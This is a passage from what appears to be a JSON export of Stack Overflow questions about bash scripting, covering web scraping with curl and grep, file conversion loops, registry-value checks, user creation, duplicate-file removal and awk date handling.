http://subtitle.co.il/browsesubtitles.php?cs=movies | grep -o -P '(?<=list.php\\?mid=)\\d+'","body":"<p>New to bash scripting, The previous answers didn't helped me.</p>\n\n<p>I am trying to harvest ids from web pages and I need to parse <code>page1</code>, get a list of ids, and use them to parse corresponding web pages. </p>\n\n<p>The thing is I'm not sure how to write the script...</p>\n\n<p>Here's what I would like to do:</p>\n\n<ol>\n<li>Parse <code>url1</code> according to <code>regexp</code>. Output: list of extracted ids (<code>101</code>, <code>102</code>, <code>103</code>, etc).</li>\n<li>Parse each url with output id, for example: parse (<code>http://someurl/101</code>), then parse (<code>http://someurl/102</code>), etc.</li>\n</ol>\n\n<p>So far, I have come up with this command:  </p>\n\n<pre><code>curl http://subtitle.co.il/browsesubtitles.php?cs=movies | grep -o -P '(?&lt;=list.php\\?mid=)\\d+'  \n</code></pre>\n\n<p>The command above works, and gives a list of ids.</p>\n\n<p>Any advice for the next steps? Am I on the right track?</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","for-loop"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12718480,"title":"Find all files that need updating","body":"<p>I use the script below to convert all pdf files in a directory to png files, and I want to run it only over the files that have yet to be converted.</p>\n\n<pre><code>#!/bin/bash\n# Convert pdf to png\nfor f in *.pdf\ndo\n    echo \"Converting $f\"\n    gs -dNOPAUSE -dBATCH -sDEVICE=png256 -r480 -q -sOutputFile=\"png/$f.png\" \"$f\"\ndone\nrename -f 's/\\.pdf\\.png/\\.png/' png/*.pdf.png\n</code></pre>\n\n<p>How do I modify the loop so that it is restricted to files where the corresponding png file either does not exist or is older than the pdf file?</p>\n"},{"tags":["regex","bash","registry"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12716836,"title":"Strict Regular Expression String Comparison in Bash Script","body":"<p>I'm attempting to write a simple Bash script that will help me verify some Windows registry settings. All the data is within folders (which is the computer's hostname), and at the path stated in the script. The end goal is to verify the hosts that have the value incorrectly set, based on registry key value at the end of the line.</p>\n\n<p>For reference of the script, parameter one is the registry key I would like to look for, parameter two is the value it should be. If <code>$control</code> matches what is on the end of <code>$value</code>'s string then it should output the machine name which is the variable <code>$FOLDER</code></p>\n\n<pre><code>list=$(ls)\nregkey=$1\ncontrol=$2\n\nfor FOLDER in $list\ndo\nvalue=$($FOLDER/policies/Effective-Security-policy.txt | grep \"$regkey\")\nif [[ \"$value\" =~ $control ]] ;\n    then\n        echo $FOLDER\n    else\n        continue\nfi  \ndone\n</code></pre>\n\n<p>However, I can't get it to do a strict compare, because there is also a registry key named <code>RestrictAnonymousSAM</code> and it will list out values that are incorrect.</p>\n\n<p>Here are some of the lines from within the text file, I need to be able to differentiate between the two, so the returned values are for that particular registry key:</p>\n\n<pre><code>MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\RestrictAnonymous=4,0\nMACHINE\\System\\CurrentControlSet\\Control\\Lsa\\RestrictAnonymousSAM=4,1\n</code></pre>\n"},{"tags":["bash","wget"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12716976,"title":"wget and changing directory in a bash script","body":"<p>How do I change to a directory A, run <code>wget</code> in directory A, then change to another directory B, and run <code>wget</code> in directory B?</p>\n\n<p>I have the following code:</p>\n\n<pre><code>#!/bin/bash\n\ncd directory_A &amp;&amp; wget --spider -i addresses.txt &amp;&amp; cd ..;\ncd directory_B &amp;&amp; wget --spider -i addresses.txt &amp;&amp; cd ..;\n</code></pre>\n\n<p>My code is failing at the end of the first <code>wget</code>. However, if I replace wget with some other command, like <code>touch</code> or <code>pwd</code>, the script works as intended.</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash","script","centos"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12716633,"title":"Bash script says command not found","body":"<p>I try to run the following bash script to create a bunch of users, groups, home dirs for the users and correct permissions for all of these. The OS is CentOS.</p>\n\n<p>When I try to run the following, which I though should work, it returns \"command not found\" when running via terminal. it only gets as far as creating the /homedirs directory, nothing more. I'm a total noob at bash scripting so forgive me if this looks ugly.</p>\n\n<pre><code>mkdir /homedirs; chmod 775 /homedirs;\n\nfor iYear in {1..3} do\n    sYear = $iYear\"ti\"\n    sYearDir = \"/homerirs/\"$sYear\n    groupadd $sYear; mkdir $sYearDir; chgrp $sYear $sYearDir; chmod 750 $sYearDir\n\n    for sClass in {a,b} do\n        sClassDir = $sYearDir/$sClass\n        mkdir $sClassDir\n        sClassGrp = $sYear$sClass\n        groupadd $sClassGrp; chgrp $sClassGrp $sClassDir; chmod 750 $sClassDir\n\n        for iUser in {1..3} do\n            sUserName = \"i\"$iYear$sClass\"g\"$iUser\n            sUserDir = $sClassDir/$sUserName\n            useradd -d $sUserDir -g $sClassGrp -G $sYear -m $sUserName\n            chown $sUserName $sUserDir; chmod 750 $sUserDir\n        done\n    done\ndone\n</code></pre>\n"},{"tags":["bash","path"],"answer_count":16,"favorite_count":5,"up_vote_count":4,"down_vote_count":0,"view_count":1214,"score":4,"question_id":670488,"title":"How to manage Long Paths in Bash?","body":"<p>I have a problem to manage long paths. How can I get quickly to paths like </p>\n\n<pre><code>/Users/User/.../.../.../.../.../Dev/C/card.c\n</code></pre>\n\n<p>I tried an alias</p>\n\n<pre><code>alias cd C='cd /Users/User/.../.../.../.../.../Dev/C'\n</code></pre>\n\n<p>but I am unable to do aliases for two separate words. I have long lists of Bash aliases and paths in CDPATH, so I am hesitating to make them more. How can manage long paths?</p>\n\n<p><strong>[Ideas for Replies]</strong></p>\n\n<p>The user litb's reply revealed some of my problems in the management. Things, such as \"CTRL+R\", \"!-3:1:2:4:x\" and \"incremental search\", are hard for me. They probably help in navigating long directories and, in the sense, management.</p>\n"},{"tags":["bash","sed","awk","find","file-rename"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12714622,"title":"Bulk rename files after sed -i","body":"<p>This script correctly finds the files I need and replaces consecutive spaces with a single space:</p>\n\n<pre><code>find . -type f -iname *-[0-9][0-9][0-9][0-9][0-9]-* ! -iname *.gz ! -iname *_processed -print0 | xargs -0 sed -i  's/ \\+ / /g'\n</code></pre>\n\n<p>What I need now is to append <code>_parsed</code> to the end of each file's <strong>filename</strong> so that the files are ignored the next time this script is run. </p>\n\n<p>What is a good way to do this? Note: the files have no extension. The filenames look like this:</p>\n\n<pre><code>./1923/338810-99999-1923\n./1921/999999-41406-1921\n./1953/320590-99999-1953\n./1911/241360-99999-1911\n./1923/307330-99999-1923\n./1983/802220-99999-1983\n</code></pre>\n\n<p>Edit: I am using CentOS 6. Python-based solutions would work as well.</p>\n"},{"tags":["bash","compression","symlink","tar","rhel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12714807,"title":"How can I compress a directory, and convert soft to hard links?","body":"<p>I would like to compress a directory.</p>\n\n<pre><code>tar -cvzf mydir.tar.gz mydir\n</code></pre>\n\n<p>but this retains symlinks so that it is not portable to a new system.</p>\n\n<p>How can I convert symlinks?</p>\n\n<p>I have tried </p>\n\n<pre><code>tar -cvzfh \n</code></pre>\n\n<p>since <code>man tar</code> says  </p>\n\n<blockquote>\n  <p>-h, --dereference</p>\n\n<pre><code>          don’t dump symlinks; dump the files they point to\n</code></pre>\n</blockquote>\n\n<p>but this results in an error</p>\n\n<pre><code>tar: Error exit delayed from previous errors\n</code></pre>\n\n<p>and creates a file called \"zh\"</p>\n\n<p>My files are on a RHEL server. </p>\n"},{"tags":["linux","bash"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":49,"score":0,"question_id":12703948,"title":"Mongrel restart script in .sh file is not working","body":"<p>When I run script to restart <code>mongrel</code> written in <code>.sh</code> file , It is not working properly.</p>\n\n<p>Below are the commands written in the script.</p>\n\n<pre><code>cd /home/apps/stage/bd/log &amp;&amp; rm mongrel.pid -f\npkill -9 mongrel_rails -u bandega\ncd /home/apps/stage/bd &amp;&amp; mongrel_rails start -e production -p 4184 -d\n</code></pre>\n\n<p>But when I manually run all above commands one by one on terminal, It is working properly and server is started properly.</p>\n\n<p>Is there are some problems while running script in .sh file?</p>\n"},{"tags":["ruby","bash","unix","tree","pry"],"answer_count":2,"favorite_count":4,"up_vote_count":5,"down_vote_count":0,"view_count":439,"score":5,"question_id":8304172,"title":"tree command on osx bash","body":"<p>I'm following a <a href=\"http://vimeo.com/26391171\">screen cast</a> on a ruby gem called <a href=\"http://pry.github.com/\">pry</a>. At 8:10, the .tree command is used, which I believe is a Unix command. </p>\n\n<p>It does not appear to be working on my system:</p>\n\n<pre><code>[24] pry(main)&gt; .tree\n\\Error: there was a problem executing system command: tree\n</code></pre>\n\n<p>and I have traced the issue to <a href=\"http://rubydoc.info/github/pry/pry/master/Pry/DefaultCommands\">here</a>, in which pry references a shell command:</p>\n\n<pre><code>Pry::CommandSet.new do\n\n  command(/\\.(.*)/, \"All text following a '.' is forwarded to the shell.\", :listing =&gt; \".&lt;shell command&gt;\") do |cmd|\n    if cmd =~ /^cd\\s+(.+)/i\n      dest = $1\n      begin\n        Dir.chdir File.expand_path(dest)\n      rescue Errno::ENOENT\n        output.puts \"No such directory: #{dest}\"\n      end\n\n    else\n      if !system(cmd)\n        output.puts \"Error: there was a problem executing system command: #{cmd}\"\n      end\n    end\n  end\n</code></pre>\n\n<p>from the context of bash I tried using the command tree with no luck:</p>\n\n<pre><code>projects/sms(apps2)$ tree\n-bash: tree: command not found\n~/projects/sms(apps2)$ .tree\n-bash: .tree: command not found\n</code></pre>\n\n<p>This looks incredibly useful, how can I get this command?</p>\n"},{"tags":["bash","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12711608,"title":"Segmentation fault when looping through directories with bash script","body":"<p>I understand this is usually to do with recursion, except I am pretty sure I am not doing this.\nOn each time round the loop it gives a segmentation error pointing to the for loop's line.</p>\n\n<pre><code>for file in $DATAFOLDER*; do\n    echo $file;\n    filename=$(basename $file);\n    echo $filename;\n    echo \"$DESTFOLDER$SUBFOLDER${filename%%.*}\"\n    pwd\n    # move data to cppapplication folder\n    cp -R \"$file\" \"$DESTFOLDER\";\n    sleep 1\n    # create subdirectory\n    mkdir \"$SUBFOLDER\";\n    # create new folder for extracted data\n    mkdir \"$DESTFOLDER$SUBFOLDER${filename%%.*}\";\n    # copy MassLynx header file into new folder (get the description info)\n    cp \"$file/_HEADER.TXT\" \"$DESTFOLDER$SUBFOLDER${filename%%.*}\";\n    # run the cppapplication\n    # &lt;program&gt; &lt;project file&gt; &lt;MassSpectrum&gt; &lt;Mobilogram&gt; &lt;bins in Da&gt; &lt;extract m/z ranges&gt;\n    ./cppapplication.exe \"$filename\" 0 1 1 0 ;\n    # fix last character comma bug\n    sed -i '$ s/,$//g' MassMobility.txt\n    # move the created files into the new folder\n    mv Mobilogram.txt \"$DESTFOLDER$SUBFOLDER${filename%%.*}\";\n    mv MassMobility.txt \"$DESTFOLDER$SUBFOLDER${filename%%.*}\"; \n    mv MassMobilityXaxis.txt \"$DESTFOLDER$SUBFOLDER${filename%%.*}\";\n    mv MassMobilityYaxis.txt \"$DESTFOLDER$SUBFOLDER${filename%%.*}\";    \n    # get driftscope quicklook image\n    sleep 3\n    python \"C:\\Users\\ganesh\\Dropbox\\PhD\\03_Amphitrite\\CppApplication\\quicklook_driftscope.py\" \"$DESTFOLDERWINDOWS$SUBFOLDERWINDOWS\" \"${filename%%.*}\" \"$DESTFOLDERWINDOWS$SUBFOLDERWINDOWS${filename%%.*}\";\n\n\n    # remove MassLynx Project\n    rm -r \"$filename\";\n\ndone\n</code></pre>\n\n<p>Aside from the copying of the file, I don't think the loop has any contact with the original folder being looped through.</p>\n\n<p>This is the error:</p>\n\n<pre><code>./extract_all_projects.sh: line 26:  7500 Segmentation fault      (core dumped) \n</code></pre>\n\n<p>I have no idea what the problem is as \"cppapplication.exe\" works fine on these files if run outside of the bash script.</p>\n"},{"tags":["python","bash","shebang"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":12713555,"title":"Python shebang and newlines","body":"<p>To make a Python script executable on Linux and bash, one uses the shebang</p>\n\n<pre><code>#! /usr/bin/env python\n</code></pre>\n\n<p>as the first line of the script. If this line happens to end with the Windows-style newline \\r\\n (carriage return - line feed), instead of the Unix-style newline \\n, then bash will not be able to run the script through the Python interpreter.</p>\n\n<p>I am doing cross-platform development in Python. When I work in Windows, the natural newline is \\r\\n. When I work in Linux, the natural newline is \\n. Given that I use Mercurial for version control, what would be the best way to enforce the use of the \\n newline in the script file containing the shebang?</p>\n"},{"tags":["bash","command-line","nginx","homebrew",".bash-profile"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":12713233,"title":"NGINX brew install command not found","body":"<p>I do</p>\n\n<pre><code>$ brew install nginx\n</code></pre>\n\n<p>and get:</p>\n\n<pre><code>==&gt; Downloading http://nginx.org/download/nginx-1.2.2.tar.gz\nAlready downloaded: /Library/Caches/Homebrew/nginx-1.2.2.tar.gz\n==&gt; Patching\npatching file conf/nginx.conf\n==&gt; ./configure --prefix=/usr/local/Cellar/nginx/1.2.2 --with-http_ssl_module --with-pcre         --with-ipv6 --with-cc-opt=-I/usr/local/include --with-ld-opt=-L/usr/local/lib --conf\n==&gt; make\n==&gt; make install\n==&gt; Caveats\nIn the interest of allowing you to run `nginx` without `sudo`, the default\nport is set to localhost:8080.\n\nIf you want to host pages on your local machine to the public, you should \nchange that to localhost:80, and run `sudo nginx`. You'll need to turn off\nany other web servers running port 80, of course.\n\nYou can start nginx automatically on login running as your user with:\nmkdir -p ~/Library/LaunchAgents\ncp /usr/local/Cellar/nginx/1.2.2/homebrew.mxcl.nginx.plist ~/Library/LaunchAgents/\nlaunchctl load -w ~/Library/LaunchAgents/homebrew.mxcl.nginx.plist\n\nThough note that if running as your user, the launch agent will fail if you\ntry to use a port below 1024 (such as http's default of 80.)\nWarning: /usr/local/sbin is not in your PATH\nYou can amend this by altering your ~/.bashrc file \n</code></pre>\n\n<p>I have this in my ~/.bashrc file:</p>\n\n<pre><code> export PATH=$PATH:/usr/local/sbin\n</code></pre>\n\n<p>When I run nginx -v or sudo nginx -t i get this: </p>\n\n<pre><code>-bash: nginx: command not found\n</code></pre>\n\n<p>have I not installed nginx properly? </p>\n"},{"tags":["bash","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":59,"score":6,"question_id":12713336,"title":"In shell, how do I delete numbered duplicate files?","body":"<p>I've got a directory with a few thousand files in it, named things like:</p>\n\n<pre><code>filename.ext\nfilename (1).ext\nfilename (2).ext\notherfile.ext\notherfile (1).ext\netc.\n</code></pre>\n\n<p>Most of the files with bracketed numbers are duplicates of the original, but in some cases they're not.</p>\n\n<p>How can I keep my original files, delete the duplicates, but not lose the files that are different?</p>\n\n<p>I know that I could <code>rm *\\).ext</code>, but that obviously doesn't make sure that files match the original.</p>\n\n<p>I'm using OS X, so I have a <code>md5</code> program that functions sort of like <code>md5sum</code> in Linux, though it puts the hash at the end of the line instead of the beginning.  I was thinking I could use an awk script to take the output of <code>md5 *.ext | awk 'some script'</code>, find duplicates by md5, and delete them, but the command line is too long (<code>bash: /sbin/md5: Argument list too long</code>).</p>\n\n<p>And I don't know what to write in the script.  I was thinking of storing things in an array with this:</p>\n\n<pre><code>awk '{a[$NF]++} a[$NF]&gt;1{sub(/).*/,\"\"); sub(/.*(/,\"\"); system(\"rm \" $0);}'\n</code></pre>\n\n<p>But that always seems to delete my original.</p>\n\n<p>What am I doing wrong?  How do I do it right?</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash","cron","ffmpeg","queue","batch-processing"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12698006,"title":"How do I set up an ffmpeg queue?","body":"<p>I am trying to encode many videos on my server, but FFMPEG is resource intensive so I would like to setup some form of queueing. The rest of my site is using PHP, but I don't know if I should use PHP, Python, BASH, etc. I was thinking I might need to use CRON but I am not really sure exactly how to tell ffmpeg to start a new task (from the list) after it finishes the one before it. </p>\n"},{"tags":["java","linux","bash","email","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":11281893,"title":"How to split mailbox into single file per message?","body":"<p>I'd like to split my inbox into separate files (one file per one message) by bash command, or may be simple program in Java. How can I do it?</p>\n\n<p>WBR, Thanx.</p>\n"},{"tags":["git","bash","shell","emacs"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":365,"score":3,"question_id":10355902,"title":"Use emacsclient -t when committing in Git","body":"<p>In my <code>.bash_profile</code>, I use this:</p>\n\n<pre><code>export EDITOR=emacsclient\nalias e='emacsclient -t'\n</code></pre>\n\n<p>When I commit changes with Git, it will open a new  emacs window, but with <code>emacs --daemon</code>.\nHow can I set my default Git editor to be emacs with the t flag enabled?</p>\n"},{"tags":["html","string","bash","extract"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12710523,"title":"Substring extract from html: BASH","body":"<p>I need to extract the video names from youtube's index.html. I have been able to break apart the file into small chunks, each containing one video listing, however I cannot seem to extract the video title. My professor has provided the following command, however I cannot seem to get it to work in this situation. </p>\n\n<pre><code>number=`expr \"$s\" : \".*\\/\\([0-9,]*\\)\\/\"`; echo $number # will print 250,4211\n</code></pre>\n\n<p>Although I'm not completely sure, I think I'm having trouble getting this method to work because there aren't spaces between the video title and surrounding text. Here is a sample of what I would need to extract the title from:</p>\n\n<pre><code>&lt;li class=\"video-list-item \"&gt;&lt;a href=\"/watch?v=9BbgvlgDQMg&amp;amp;feature=g-sptl&amp;amp;cid=inp-hs-edt\" class=\"video-list-item-link yt-uix-sessionlink\" data-sessionlink=\"ei=CMzmroaB5bICFRiXIQoda3kX5g%3D%3D&amp;amp;feature=g-sptl%26cid%3Dinp-hs-edt\" &gt;&lt;span class=\"ux-thumb-wrap contains-addto \"&gt;&lt;span class=\"video-thumb ux-thumb yt-thumb-default-120 \"&gt;&lt;span class=\"yt-thumb-clip\"&gt;&lt;span class=\"yt-thumb-clip-inner\"&gt;&lt;img src=\"http://s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif\" alt=\"Lil&amp;#39; Buck &amp;quot;Golden Gateway&amp;quot; Venice Beach California YAK FILMS Super Bowl 2012 Madonna Memphis Jookin\" data-thumb=\"//i2.ytimg.com/vi/9BbgvlgDQMg/default.jpg\" width=\"120\" &gt;&lt;span class=\"vertical-align\"&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=\"video-time\"&gt;3:51&lt;/span&gt;\n</code></pre>\n\n<p>Out of this chunk of text, I would need to extract \"<strong>Lil&#39; Buck &quot;Golden Gateway&quot; Venice Beach California YAK FILMS Super Bowl 2012 Madonna Memphis Jookin</strong>\", without the quotes.</p>\n"},{"tags":["linux","bash","sed","awk"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":114,"score":2,"question_id":12703723,"title":"How to make a check correction of date and split not a standart string AWK","body":"<p>I have got an input file with following syntax:</p>\n\n<pre><code>\"ID\",\"Company Name\",\"AccountManager\",\"Product\",\"Support Type\",\"Country\"\n</code></pre>\n\n<p>Example:</p>\n\n<pre><code>\"1\",\"Company one\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\",\"29.10.2012 ► Type of support\",\"Russia\"\n\n\"2\",\"Company two\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\",\"31.10.2012 ► Type of support\\n28.10.2012 ► Type of support\\nn/a ► Type of support\",\"Foreign\"\n\n\"3\",\"Company three\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version,\"31.12.2012 ► Type of support\\nType of support\\nn\\\\a ► Type of support\\n31.03.2013 ► Type of support\\n25.10.2012 ► Type of support\\nn\\\\a ► Type of support\",\"Russia\"\n\n\"4\",\"Company fourth\",\"Surname Name / Phone/ Cell Phone \",\"1) Product► (d2XXXXXX) ► Version\\n2) Product► (d2XXXXXX) ► Version\\n3) Product► (d2XXXXXX) ► Version\\n4) Product► (d2XXXXXX) ► Version\\n5) Product► (d2XXXXXX) ► Version\\n6) Product► (d2XXXXXX) ► Version,\"1) 31.12.2012 ► Type of support\\n2) Type of support\\n3) n\\\\a ► Type of support\\n4) 31.03.2013 ► Type of support\\n5) 25.10.2012 ► Type of support\\n6) n\\\\a ► Type of support\",\"Foreign\"\n\n\"5\",\"Company five\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\",\"33.10.2012 ► Type of support\",\"Russia\"\n</code></pre>\n\n<p>The first company has only one product, the second company has 3 products - they are separated with <code>\\n</code> (Product and Support Type), the third company has 6 products, the fouth company has 6 products, but not in a standart string (1), 2) and etc.), the fifth company has 1 product, but there is an error in date (33).</p>\n\n<p>In the output this string must be separate and repeat values of the columns:</p>\n\n<p><code>\"ID\",\"Company Name\",\"AccountManager\",\"Country\"</code>, but <code>\"AccountManager\"</code> should have only Surname and Name, and column Support Type should be compared with today date - if date in support type different with today date in values from 27 to 32 days this columns must be in output file. If we have got <code>n/a</code> in the Support Type it should be missed.</p>\n\n<p>The output should look like:\nIn file Russia.csv:</p>\n\n<pre><code>\"1\",\"Company one\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"29.10.2012\",\"Russia\"\n\"3\",\"Company three\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"25.10.2012\",\"Russia\"\n</code></pre>\n\n<p>In file Foreign.csv:  </p>\n\n<pre><code>\"2\",\"Company two\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"28.10.2012\",\"Foreign\"\n\"2\",\"Company two\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"31.10.2012\",\"Foreign\"\n\"4\",\"Company fourth\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"25.10.2012\",\"Foreign\"\n</code></pre>\n\n<p>In Error.csv:</p>\n\n<pre><code> Error in date! \"5\",\"Company five\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\",\"33.10.2012 ► Type of support\",\"Russia\"\n</code></pre>\n\n<p>I have got a script that compare with dates (27 to 32) but not with checking correct date, splitting strings with counting and separate files output:</p>\n\n<pre><code>#/usr/bin/awk -f\n\nBEGIN {\n    FS=\",\";\n    \"date +\\\"%s\\\"\" | getline curr_timestamp;\n}\n\n{\n    split($3, account, \"/\");\n    gsub(/ $/, \"\", account[1]);\n    split($4, products, \"\\\\\\\\n\");\n    split($5, supports, \"\\\\\\\\n\");\n    for (i in products) {\n        gsub(\"\\\"\", \"\", products[i]);\n        gsub(\"\\\"\", \"\", supports[i]);\n        split(supports[i], timesupport, \" \");\n        # ignore not available and support without date\n        if (supports[i] !~ /n\\\\\\\\a*/ &amp;&amp; supports[i] !~ /n\\/a*/ &amp;&amp; $2 !~ /\\NULL/ &amp;&amp; timesupport[1] ~ /[0-9][0-9].[0-9][0-9].[0-9][0-9][0-9][0-9]/) {\n            # formatting date\n            split(timesupport[1], date, \"\\.\");\n            mydate = \"date -d \\\"\"date[3]\"/\"date[2]\"/\"date[1]\"\\\" \\\"+%s\\\"\";\n            # date to timestamp (using bash)\n            mydate | getline timestamp;\n            # timestamp is &gt;= 27 days and &lt;= 32 days\n            if ((timestamp-curr_timestamp) &gt;= 2332800 &amp;&amp; (timestamp-curr_timestamp) &lt;= 2764800)\n                print $1\",\"$2\",\"account[1]\"\\\",\\\"\"products[i]\"\\\",\\\"\"supports[i]\"\\\",\"$6;\n        }\n    }\n}\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12710439,"title":"bash, 2 clause if statement","body":"<pre><code>if [[ $GreaterThanTwenty==1 &amp;&amp;  $LessThanThirty==1 ]]\nthen\n    echo \"within limits\"\nelse\n    echo \"Outside limits\"\nfi\necho $GreaterThanTwenty\necho $LessThanThirty\n</code></pre>\n\n<p>Why is Within limits triggered even though the echoes show that at this point LessThanThirty is actually 0?</p>\n"},{"tags":["linux","bash","shell","unix","aix"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":12709510,"title":"Shell Script is copying every file from parent directory","body":"<p>I'm trying to copy $CurrentFile from $CurrentDir to $CurrentBackup. The problem that I'm having is that this file copies every $CurrentFile from parent directory.\nSo for example,</p>\n\n<p>let say input is this</p>\n\n<pre><code>CurrentDir=/home/usr/logs\nCurrentFile='SystemOut_*'\nCurrentDay=6\nCurrentBackup=/backup\n</code></pre>\n\n<p>But, this command will copy every $CurrentFile from /home/usr/Serverinf to $CurrentBackup...</p>\n\n<pre><code>find . $CurrentDir . -type f -name $CurrentFile -mtime +$CurrentDay -exec cp {} $CurrentBackup \\;\n</code></pre>\n\n<p>I'm not sure what I did wrong...Can anyone tell me what I did wrong?\nIf I can't use this command, could you tell me alternative command for this?</p>\n\n<p>Thanks for your help!</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12708680,"title":"bash checking all the elements in a list are within a range","body":"<pre><code>LessThanThirty=1\nGreaterThanTwenty=1\n\nwhile read line \ndo\n    LessThanThirty=$(echo \"$line &lt;= 30.0\" | bc)\n    GreaterThanTwenty=$(echo \"$line &gt;= 20.0\" | bc)\ndone &lt; &lt;(grep -A 26 \"some text\" someFile.txt | awk '/More Text/ { gsub(/M/, \" \"); print $4 }'     | uniq )\n\necho $LessThanThirty\necho $GreaterThanTwenty\n</code></pre>\n\n<p>I have a whole list of numbers and want to test that they are all within the range of 20 - 30. if any of them are greater than 30 then LessThanThirty should remain false. As it stands, my Echo's at the end are only reporting the status of the checks on the last element in the list. I need a way for my variables to be set false if ANY of the numbers in the list are within the range.</p>\n"},{"tags":["bash","shell"],"answer_count":5,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":1232,"score":0,"question_id":5043808,"title":"How to find processes based on port and kill them all?","body":"<p>find processes based on port number and kill them all.\nps -efl | grep PORT_NUMBER | kill -9 process_found_previously</p>\n\n<p>how to complete the last column?</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":59,"score":4,"question_id":12704740,"title":"bash store output as a variable","body":"<pre><code>grep -A 26 \"some text\" somefile.txt |\n   awk '/other text/ { gsub(/M/, \" \"); print $4 }' |\n   sort -n -r | uniq | head -1\n</code></pre>\n\n<p>will return the largest in a list pulled from a large text file, but how do I store the output as a variable?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12705207,"title":"Bash variables and outputs","body":"<pre><code>grep -A 26 \"some text\" somefile.txt |\nawk '/other text/ { gsub(/M/, \" \"); print $4 }' | while read line\ndo\n   //operations resulting in a true of false answer\ndone\n</code></pre>\n\n<p>The variables declared and used in the while only exist with the sub-shell created by piping to it, how do I keep track of them from outside? I need to use the returned true or false later in the script</p>\n"},{"tags":["bash","awk","grep"],"answer_count":8,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":8056,"score":5,"question_id":4795323,"title":"grep for multiple strings in file on different lines (ie. whole file, not line based search)?","body":"<p>I have a lot of files, each containing a list subtitles which are on certain DVDs, like this:</p>\n\n<pre><code>Disc Title: unknown\nTitle: 01, Length: 01:33:37.000 Chapters: 33, Cells: 31, Audio streams: 04, Subpictures: 20\n        Subtitle: 01, Language: ar - Arabic, Content: Undefined, Stream id: 0x20, \n        Subtitle: 02, Language: bg - Bulgarian, Content: Undefined, Stream id: 0x21, \n        Subtitle: 03, Language: cs - Czech, Content: Undefined, Stream id: 0x22, \n        Subtitle: 04, Language: da - Dansk, Content: Undefined, Stream id: 0x23, \n        Subtitle: 05, Language: de - Deutsch, Content: Undefined, Stream id: 0x24, \n(...)\n</code></pre>\n\n<p>Now I'd like to grep for files containing \"Dansk AND Svenska AND Norsk\" on any line, with a usable returncode (as I really only like to have the info that the strings are contained, my one-liner goes a little further then this).</p>\n\n<p>So basically, this is part of a one-liner:</p>\n\n<pre><code>for all files in directory;\n if file contains \"Dansk\" AND \"Norsk\" AND \"Svenska\" then\n then echo the filename\nend\n</code></pre>\n\n<p>Any ideas, please? I'd especially like to improve my grep and awk knowledge... Thanks!</p>\n"},{"tags":["linux","bash","shell","script","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12701698,"title":"SH Moving files to a dir but create symbolic links","body":"<p>I need to create a sh script for moving all files in a directory to another but creating symbolic links to all the files..</p>\n\n<pre><code>#pseudocode\nmv /dir/*.* /dir2/\nls -s ...\n</code></pre>\n"},{"tags":["ruby","bash","monit","openwrt","ash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12706968,"title":"Ash 